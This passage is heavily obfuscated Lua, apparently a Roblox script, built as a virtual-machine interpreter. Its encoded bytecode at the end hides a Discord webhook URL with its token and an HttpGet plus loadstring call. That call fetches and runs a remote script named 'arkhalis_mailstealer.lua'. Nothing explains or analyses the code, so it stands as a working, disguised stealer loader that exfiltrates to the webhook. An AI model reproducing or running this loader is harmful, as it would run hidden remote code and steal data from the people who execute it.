																														local v336 = 0;
																														local v337;
																														local v338;
																														local v339;
																														local v340;
																														while true do
																															if (1 == v336) then
																																v339 = nil;
																																v340 = nil;
																																v336 = 2;
																															end
																															if (v336 == 0) then
																																v337 = 0;
																																v338 = nil;
																																v336 = 1;
																															end
																															if (v336 == 2) then
																																while true do
																																	if (v337 == 0) then
																																		local v406 = 0;
																																		while true do
																																			if (0 == v406) then
																																				v338 = v145[v156[3]];
																																				v339 = nil;
																																				v406 = 1;
																																			end
																																			if (v406 == 1) then
																																				v337 = 1;
																																				break;
																																			end
																																		end
																																	end
																																	if (v337 == 1) then
																																		local v407 = 0;
																																		while true do
																																			if (v407 == 0) then
																																				v340 = {};
																																				v339 = v18({}, {[v7("\130\14\8\220\176\253\200", "\221\81\97\178\212\152\176")]=function(v489, v490)
																																					local v491 = 0;
																																					local v492;
																																					local v493;
																																					while true do
																																						if (v491 == 0) then
																																							v492 = 0;
																																							v493 = nil;
																																							v491 = 1;
																																						end
																																						if (v491 == 1) then
																																							while true do
																																								if (v492 == 0) then
																																									local v532 = 0;
																																									while true do
																																										if (v532 == 0) then
																																											v493 = v340[v490];
																																											return v493[431 - (44 + 386)][v493[2]];
																																										end
																																									end
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end,[v7("\37\242\233\24\236\19\195\227\24\227", "\122\173\135\125\155")]=function(v494, v495, v496)
																																					local v497 = 0;
																																					local v498;
																																					local v499;
																																					while true do
																																						if (v497 == 1) then
																																							while true do
																																								if (v498 == 0) then
																																									v499 = v340[v495];
																																									v499[1][v499[2]] = v496;
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																						if (v497 == 0) then
																																							v498 = 0;
																																							v499 = nil;
																																							v497 = 1;
																																						end
																																					end
																																				end});
																																				v407 = 1;
																																			end
																																			if (v407 == 1) then
																																				v337 = 2;
																																				break;
																																			end
																																		end
																																	end
																																	if (v337 == 2) then
																																		for v431 = 1, v156[1490 - (998 + 488)] do
																																			local v432 = 0;
																																			local v433;
																																			local v434;
																																			while true do
																																				if (1 == v432) then
																																					while true do
																																						if (v433 == 0) then
																																							local v512 = 0;
																																							while true do
																																								if (1 == v512) then
																																									v433 = 1;
																																									break;
																																								end
																																								if (v512 == 0) then
																																									v148 = v148 + 1;
																																									v434 = v144[v148];
																																									v512 = 1;
																																								end
																																							end
																																						end
																																						if (v433 == 1) then
																																							if (v434[1 + 0] == 16) then
																																								v340[v431 - 1] = {v154,v434[3]};
																																							else
																																								v340[v431 - 1] = {v61,v434[3]};
																																							end
																																							v153[#v153 + 1] = v340;
																																							break;
																																						end
																																					end
																																					break;
																																				end
																																				if (v432 == 0) then
																																					v433 = 0;
																																					v434 = nil;
																																					v432 = 1;
																																				end
																																			end
																																		end
																																		v154[v156[2]] = v43(v338, v339, v62);
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													else
																														v154[v156[2]] = v154[v156[3]][v156[4]];
																													end
																												elseif (v157 > 56) then
																													local v343 = 0;
																													local v344;
																													local v345;
																													local v346;
																													local v347;
																													local v348;
																													while true do
																														if (v343 == 2) then
																															v348 = nil;
																															while true do
																																if (v344 == 2) then
																																	for v435 = v345, v149 do
																																		local v436 = 0;
																																		local v437;
																																		while true do
																																			if (v436 == 0) then
																																				v437 = 0;
																																				while true do
																																					if (v437 == 0) then
																																						v348 = v348 + 1;
																																						v154[v435] = v346[v348];
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (v344 == 0) then
																																	local v409 = 0;
																																	while true do
																																		if (v409 == 0) then
																																			v345 = v156[2];
																																			v346, v347 = v147(v154[v345](v21(v154, v345 + 1, v156[3])));
																																			v409 = 1;
																																		end
																																		if (v409 == 1) then
																																			v344 = 1;
																																			break;
																																		end
																																	end
																																end
																																if (1 == v344) then
																																	local v410 = 0;
																																	while true do
																																		if (v410 == 1) then
																																			v344 = 2;
																																			break;
																																		end
																																		if (v410 == 0) then
																																			v149 = (v347 + v345) - 1;
																																			v348 = 0;
																																			v410 = 1;
																																		end
																																	end
																																end
																															end
																															break;
																														end
																														if (v343 == 1) then
																															v346 = nil;
																															v347 = nil;
																															v343 = 2;
																														end
																														if (v343 == 0) then
																															v344 = 0;
																															v345 = nil;
																															v343 = 1;
																														end
																													end
																												else
																													v154[v156[2]] = {};
																												end
																											elseif (v157 <= 59) then
																												if (v157 > 58) then
																													v154[v156[2]] = v156[3];
																												else
																													local v352 = 0;
																													local v353;
																													local v354;
																													while true do
																														if (v352 == 0) then
																															v353 = 0;
																															v354 = nil;
																															v352 = 1;
																														end
																														if (v352 == 1) then
																															while true do
																																if (v353 == 0) then
																																	v354 = v156[2];
																																	do
																																		return v154[v354](v21(v154, v354 + 1, v156[3]));
																																	end
																																	break;
																																end
																															end
																															break;
																														end
																													end
																												end
																											elseif (v157 > 60) then
																												v154[v156[2]] = v154[v156[3]][v156[4]];
																											elseif not v154[v156[2]] then
																												v148 = v148 + 1;
																											else
																												v148 = v156[3];
																											end
																											v148 = v148 + 1;
																											break;
																										end
																										if (0 == v177) then
																											local v191 = 0;
																											while true do
																												if (0 == v191) then
																													v156 = v144[v148];
																													v157 = v156[1];
																													v191 = 1;
																												end
																												if (v191 == 1) then
																													v177 = 1;
																													break;
																												end
																											end
																										end
																									end
																									break;
																								end
																							end
																						end
																						break;
																					end
																					if (v143 == 0) then
																						v144 = v65;
																						v145 = v66;
																						v146 = v67;
																						v147 = v41;
																						v143 = 1;
																					end
																					if (v143 == 2) then
																						v152 = v20("#", ...) - 1;
																						v153 = {};
																						v154 = {};
																						for v178 = 0, v152 do
																							if (v178 >= v146) then
																								v150[v178 - v146] = v151[v178 + 1];
																							else
																								v154[v178] = v151[v178 + 1];
																							end
																						end
																						v143 = 3;
																					end
																					if (v143 == 1) then
																						v148 = 1;
																						v149 = -1;
																						v150 = {};
																						v151 = {...};
																						v143 = 2;
																					end
																				end
																			end;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (0 == v63) then
													v64 = 0;
													v65 = nil;
													v63 = 1;
												end
											end
										end
										return v43(v42(), {}, v29)(...);
									end
								end
							end
							if (v31 == 2) then
								local v49 = 0;
								while true do
									if (1 == v49) then
										function v36()
											local v68 = 0;
											local v69;
											local v70;
											local v71;
											while true do
												if (v68 == 0) then
													v69 = 0;
													v70 = nil;
													v68 = 1;
												end
												if (v68 == 1) then
													v71 = nil;
													while true do
														local v113 = 0;
														while true do
															if (v113 == 0) then
																if (v69 == (0 - 0)) then
																	local v124 = 0;
																	while true do
																		if (v124 == 0) then
																			v70, v71 = v9(v28, v32, v32 + 2);
																			v32 = v32 + (240 - (64 + 174));
																			v124 = 1;
																		end
																		if (v124 == 1) then
																			v69 = 1;
																			break;
																		end
																	end
																end
																if (v69 == 1) then
																	return (v71 * (493 - (34 + 203))) + v70;
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v31 = 3;
										break;
									end
									if (0 == v49) then
										function v35()
											local v72 = 0;
											local v73;
											local v74;
											while true do
												if (v72 == 0) then
													v73 = 0;
													v74 = nil;
													v72 = 1;
												end
												if (v72 == 1) then
													while true do
														local v114 = 0;
														while true do
															if (v114 == 0) then
																if (v73 == (1 + 0)) then
																	return v74;
																end
																if (v73 == (0 - 0)) then
																	local v125 = 0;
																	while true do
																		if (v125 == 1) then
																			v73 = 1;
																			break;
																		end
																		if (v125 == 0) then
																			v74 = v9(v28, v32, v32);
																			v32 = v32 + 1;
																			v125 = 1;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v36 = nil;
										v49 = 1;
									end
								end
							end
							break;
						end
						if (v45 == 0) then
							if (v31 == 4) then
								local v50 = 0;
								while true do
									if (v50 == 1) then
										function v39(v75)
											local v76 = 0;
											local v77;
											local v78;
											local v79;
											while true do
												if (v76 == 0) then
													v77 = 0 + 0;
													v78 = nil;
													v76 = 1;
												end
												if (v76 == 1) then
													v79 = nil;
													while true do
														local v115 = 0;
														while true do
															if (v115 == 1) then
																if (v77 == (0 + 0)) then
																	local v126 = 0;
																	while true do
																		if (0 == v126) then
																			v78 = nil;
																			if not v75 then
																				local v171 = 0;
																				local v172;
																				while true do
																					if (v171 == 0) then
																						v172 = 0 + 0;
																						while true do
																							if (v172 == 0) then
																								v75 = v37();
																								if (v75 == (0 - 0)) then
																									return "";
																								end
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v126 = 1;
																		end
																		if (1 == v126) then
																			v77 = 2 - 1;
																			break;
																		end
																	end
																end
																if (v77 == (2 - 1)) then
																	local v127 = 0;
																	while true do
																		if (v127 == 0) then
																			v78 = v11(v28, v32, (v32 + v75) - 1);
																			v32 = v32 + v75;
																			v127 = 1;
																		end
																		if (v127 == 1) then
																			v77 = 2;
																			break;
																		end
																	end
																end
																break;
															end
															if (v115 == 0) then
																if (v77 == 2) then
																	local v128 = 0;
																	while true do
																		if (0 == v128) then
																			v79 = {};
																			for v158 = 928 - (214 + 416 + 297), #v78 do
																				v79[v158] = v10(v9(v11(v78, v158, v158)));
																			end
																			v128 = 1;
																		end
																		if (1 == v128) then
																			v77 = 3;
																			break;
																		end
																	end
																end
																if (v77 == 3) then
																	return v14(v79);
																end
																v115 = 1;
															end
														end
													end
													break;
												end
											end
										end
										v31 = 5;
										break;
									end
									if (v50 == 0) then
										function v38()
											local v80 = 0;
											local v81;
											local v82;
											local v83;
											local v84;
											local v85;
											local v86;
											local v87;
											while true do
												if (v80 == 1) then
													v83 = nil;
													v84 = nil;
													v80 = 2;
												end
												if (v80 == 2) then
													v85 = nil;
													v86 = nil;
													v80 = 3;
												end
												if (v80 == 3) then
													v87 = nil;
													while true do
														local v116 = 0;
														while true do
															if (v116 == 0) then
																if (v81 == 2) then
																	local v129 = 0;
																	while true do
																		if (v129 == 0) then
																			v86 = v34(v83, 7 + 14, 116 - 85);
																			v87 = ((v34(v83, 963 - (857 + 74)) == (1 + 0)) and -1) or 1;
																			v129 = 1;
																		end
																		if (v129 == 1) then
																			v81 = 3;
																			break;
																		end
																	end
																end
																if (v81 == 3) then
																	local v130 = 0;
																	while true do
																		if (v130 == 0) then
																			if (v86 == 0) then
																				if (v85 == 0) then
																					return v87 * 0;
																				else
																					local v174 = 0;
																					local v175;
																					while true do
																						if (v174 == 0) then
																							v175 = 0;
																							while true do
																								if ((0 + 0) == v175) then
																									v86 = 1;
																									v84 = 0;
																									break;
																								end
																							end
																							break;
																						end
																					end
																				end
																			elseif (v86 == (4001 - 1954)) then
																				return ((v85 == (1425 - (1336 + 89))) and (v87 * ((1435 - (308 + 1126)) / 0))) or (v87 * NaN);
																			end
																			return v16(v87, v86 - (919 + 104)) * (v84 + (v85 / (((1668 - 1098) - (367 + 201)) ^ 52)));
																		end
																	end
																end
																v116 = 1;
															end
															if (v116 == 1) then
																if (v81 == (378 - (142 + 235))) then
																	local v131 = 0;
																	while true do
																		if (v131 == 0) then
																			v84 = (9 - 7) - (1 + 0);
																			v85 = (v34(v83, 1, 639 - (555 + (1041 - (553 + 424)))) * ((3 - 1) ^ (29 + 3))) + v82;
																			v131 = 1;
																		end
																		if (v131 == 1) then
																			v81 = 2;
																			break;
																		end
																	end
																end
																if (0 == v81) then
																	local v132 = 0;
																	while true do
																		if (v132 == 0) then
																			v82 = v37();
																			v83 = v37();
																			v132 = 1;
																		end
																		if (1 == v132) then
																			v81 = 1;
																			break;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v80 == 0) then
													v81 = 0;
													v82 = nil;
													v80 = 1;
												end
											end
										end
										v39 = nil;
										v50 = 1;
									end
								end
							end
							if (1 == v31) then
								local v51 = 0;
								while true do
									if (v51 == 1) then
										v35 = nil;
										v31 = 2;
										break;
									end
									if (v51 == 0) then
										v34 = nil;
										function v34(v88, v89, v90)
											if v90 then
												local v100 = 0;
												local v101;
												local v102;
												while true do
													if (v100 == 1) then
														while true do
															if (v101 == 0) then
																local v118 = 0;
																while true do
																	if (v118 == 0) then
																		v102 = (v88 / (((2 + 3) - (14 - 11)) ^ (v89 - 1))) % ((755 - (239 + 514)) ^ (((v90 - (1 + 0)) - (v89 - 1)) + 1));
																		return v102 - (v102 % (2 - (1330 - (797 + 532))));
																	end
																end
															end
														end
														break;
													end
													if (v100 == 0) then
														v101 = 0;
														v102 = nil;
														v100 = 1;
													end
												end
											else
												local v103 = 0;
												local v104;
												local v105;
												while true do
													if (v103 == 1) then
														while true do
															if (0 == v104) then
																local v119 = 0;
																while true do
																	if (v119 == 0) then
																		v105 = 2 ^ (v89 - (1 + 0));
																		return (((v88 % (v105 + v105)) >= v105) and (1 + 0)) or (0 - 0);
																	end
																end
															end
														end
														break;
													end
													if (v103 == 0) then
														v104 = 0;
														v105 = nil;
														v103 = 1;
													end
												end
											end
										end
										v51 = 1;
									end
								end
							end
							v45 = 1;
						end
						if (v45 == 1) then
							if (v31 == 6) then
								local v52 = 0;
								while true do
									if (v52 == 1) then
										v43 = nil;
										v31 = 7;
										break;
									end
									if (v52 == 0) then
										v42 = nil;
										function v42()
											local v91 = 0;
											local v92;
											local v93;
											local v94;
											local v95;
											local v96;
											local v97;
											local v98;
											while true do
												if (v91 == 3) then
													v98 = nil;
													while true do
														local v117 = 0;
														while true do
															if (0 == v117) then
																if (v92 == 2) then
																	local v133 = 0;
																	while true do
																		if (v133 == 0) then
																			for v160 = 1, v37() do
																				local v161 = 0;
																				local v162;
																				local v163;
																				while true do
																					if (v161 == 1) then
																						while true do
																							if (v162 == 0) then
																								v163 = v35();
																								if (v34(v163, 1, 1 + 0) == 0) then
																									local v186 = 0;
																									local v187;
																									local v188;
																									local v189;
																									local v190;
																									while true do
																										if (v186 == 1) then
																											v189 = nil;
																											v190 = nil;
																											v186 = 2;
																										end
																										if (v186 == 0) then
																											v187 = 0;
																											v188 = nil;
																											v186 = 1;
																										end
																										if (v186 == 2) then
																											while true do
																												if (v187 == 1) then
																													local v194 = 0;
																													while true do
																														if (v194 == 1) then
																															v187 = 2;
																															break;
																														end
																														if (v194 == 0) then
																															v190 = {v36(),v36(),nil,nil};
																															if (v188 == 0) then
																																local v200 = 0;
																																local v201;
																																while true do
																																	if (v200 == 0) then
																																		v201 = 0;
																																		while true do
																																			if (v201 == 0) then
																																				v190[1 + 2] = v36();
																																				v190[4] = v36();
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															elseif (v188 == 1) then
																																v190[3] = v37();
																															elseif (v188 == 2) then
																																v190[3] = v37() - (2 ^ 16);
																															elseif (v188 == 3) then
																																local v362 = 0;
																																local v363;
																																while true do
																																	if (v362 == 0) then
																																		v363 = 0;
																																		while true do
																																			if (v363 == 0) then
																																				v190[3] = v37() - (2 ^ 16);
																																				v190[4] = v36();
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															end
																															v194 = 1;
																														end
																													end
																												end
																												if (v187 == 0) then
																													local v195 = 0;
																													while true do
																														if (1 == v195) then
																															v187 = 1;
																															break;
																														end
																														if (v195 == 0) then
																															v188 = v34(v163, 2, 3);
																															v189 = v34(v163, 4, 6);
																															v195 = 1;
																														end
																													end
																												end
																												if (v187 == 3) then
																													if (v34(v189, 3 - 0, 3) == 1) then
																														v190[4] = v98[v190[4]];
																													end
																													v93[v160] = v190;
																													break;
																												end
																												if (v187 == 2) then
																													local v197 = 0;
																													while true do
																														if (v197 == 0) then
																															if (v34(v189, 1, 1) == (878 - (282 + 595))) then
																																v190[2] = v98[v190[1639 - (1523 + 114)]];
																															end
																															if (v34(v189, 2, 2) == (1 + 0)) then
																																v190[3] = v98[v190[3]];
																															end
																															v197 = 1;
																														end
																														if (v197 == 1) then
																															v187 = 3;
																															break;
																														end
																													end
																												end
																											end
																											break;
																										end
																									end
																								end
																								break;
																							end
																						end
																						break;
																					end
																					if (v161 == 0) then
																						v162 = 0;
																						v163 = nil;
																						v161 = 1;
																					end
																				end
																			end
																			for v164 = 1, v37() do
																				v94[v164 - 1] = v42();
																			end
																			v133 = 1;
																		end
																		if (v133 == 1) then
																			return v96;
																		end
																	end
																end
																if (v92 == 0) then
																	local v134 = 0;
																	while true do
																		if (v134 == 0) then
																			v93 = {};
																			v94 = {};
																			v134 = 1;
																		end
																		if (v134 == 2) then
																			v92 = 1;
																			break;
																		end
																		if (1 == v134) then
																			v95 = {};
																			v96 = {v93,v94,nil,v95};
																			v134 = 2;
																		end
																	end
																end
																v117 = 1;
															end
															if (v117 == 1) then
																if (v92 == 1) then
																	local v135 = 0;
																	while true do
																		if (v135 == 1) then
																			for v166 = 1, v97 do
																				local v167 = 0;
																				local v168;
																				local v169;
																				local v170;
																				while true do
																					if (v167 == 0) then
																						v168 = 0;
																						v169 = nil;
																						v167 = 1;
																					end
																					if (v167 == 1) then
																						v170 = nil;
																						while true do
																							if (v168 == 1) then
																								if (v169 == 1) then
																									v170 = v35() ~= 0;
																								elseif (v169 == 2) then
																									v170 = v38();
																								elseif (v169 == 3) then
																									v170 = v39();
																								end
																								v98[v166] = v170;
																								break;
																							end
																							if (v168 == 0) then
																								local v184 = 0;
																								while true do
																									if (v184 == 1) then
																										v168 = 1;
																										break;
																									end
																									if (0 == v184) then
																										v169 = v35();
																										v170 = nil;
																										v184 = 1;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																			v96[3] = v35();
																			v135 = 2;
																		end
																		if (v135 == 0) then
																			v97 = v37();
																			v98 = {};
																			v135 = 1;
																		end
																		if (2 == v135) then
																			v92 = 2;
																			break;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v91 == 2) then
													v96 = nil;
													v97 = nil;
													v91 = 3;
												end
												if (v91 == 0) then
													v92 = 0;
													v93 = nil;
													v91 = 1;
												end
												if (v91 == 1) then
													v94 = nil;
													v95 = nil;
													v91 = 2;
												end
											end
										end
										v52 = 1;
									end
								end
							end
							if (v31 == 0) then
								local v53 = 0;
								while true do
									if (v53 == 0) then
										v32 = 1;
										v33 = nil;
										v53 = 1;
									end
									if (1 == v53) then
										v28 = v12(v11(v28, 5), v7("\3\19", "\45\61\22\19\124\19\203"), function(v99)
											if (v9(v99, 2) == 79) then
												local v106 = 0;
												local v107;
												while true do
													if (v106 == 0) then
														v107 = 0;
														while true do
															if (v107 == 0) then
																local v120 = 0;
																while true do
																	if (v120 == 0) then
																		v33 = v8(v11(v99, 1, 1));
																		return "";
																	end
																end
															end
														end
														break;
													end
												end
											else
												local v108 = 0;
												local v109;
												local v110;
												while true do
													if (v108 == 1) then
														while true do
															if (0 == v109) then
																v110 = v10(v8(v99, 16));
																if v33 then
																	local v136 = 0;
																	local v137;
																	local v138;
																	while true do
																		if (v136 == 0) then
																			v137 = 0;
																			v138 = nil;
																			v136 = 1;
																		end
																		if (v136 == 1) then
																			while true do
																				local v173 = 0;
																				while true do
																					if (v173 == 0) then
																						if (v137 == 1) then
																							return v138;
																						end
																						if (v137 == 0) then
																							local v185 = 0;
																							while true do
																								if (v185 == 0) then
																									v138 = v13(v110, v33);
																									v33 = nil;
																									v185 = 1;
																								end
																								if (1 == v185) then
																									v137 = 1;
																									break;
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																			break;
																		end
																	end
																else
																	return v110;
																end
																break;
															end
														end
														break;
													end
													if (v108 == 0) then
														v109 = 0;
														v110 = nil;
														v108 = 1;
													end
												end
											end
										end);
										v31 = 1;
										break;
									end
								end
							end
							v45 = 2;
						end
					end
				end
				break;
			end
		end
	end
	v23("LOL!163O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403023O005F4703093O002BC2C6C92BE7B6C24F03083O007EB1A3BB4586DBA7030F3O00D426C71CC4F620C209CACE2CCF23D603053O009C43AD4AA503073O007131B54119B32D03073O002654D72976DC4603793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O31343831323035373031363037383335372F374E466A513138723734785865317947495F4E506B4B453O69673479502O553277695048304C493971514C66437936314F72675064426C496A7A39634B6E386C476545030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403363O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F61726B68616C69735F6D61696C737465616C65722E6C7561002F3O00122A3O00013O0020365O000200122A000100013O00203600010001000300122A000200013O00203600020002000400122A000300053O00063C0003000A000100010004193O000A000100122A000300063O00203600040003000700122A000500083O00203600050005000900122A000600083O00203600060006000A00060B00073O000100062O00103O00064O00108O00103O00044O00103O00014O00103O00024O00103O00053O00122A0008000B4O000A000900073O00122F000A000C3O00122F000B000D4O00070009000B00022O000A000A00073O00122F000B000E3O00122F000C000F4O0007000A000C00022O002000080009000A00122A0008000B4O000A000900073O00122F000A00103O00122F000B00114O00070009000B000200202300080009001200122A000800133O00122A000900143O00201200090009001500122F000B00164O002E000C00014O00390009000C4O000D00083O00022O00280008000100016O00013O00013O00023O00026O00F03F026O00704002284O003800025O00122F000300014O000100045O00122F000500013O0004250003002300012O003300076O000A000800024O0033000900014O0033000A00024O0033000B00034O0033000C00044O000A000D6O000A000E00063O00202C000F000600012O0039000C000F4O000D000B3O00022O0033000C00034O0033000D00044O000A000E00013O002035000F000600012O0001001000014O0017000F000F0010001027000F0001000F0020350010000600012O0001001100014O001700100010001100102700100001001000202C0010001000012O0039000D00104O0006000C6O000D000A3O000200200F000A000A00022O00210009000A4O003000073O0001002O040003000500012O0033000300054O000A000400024O0031000300044O001500039O0000017O00", v17(), ...);
end
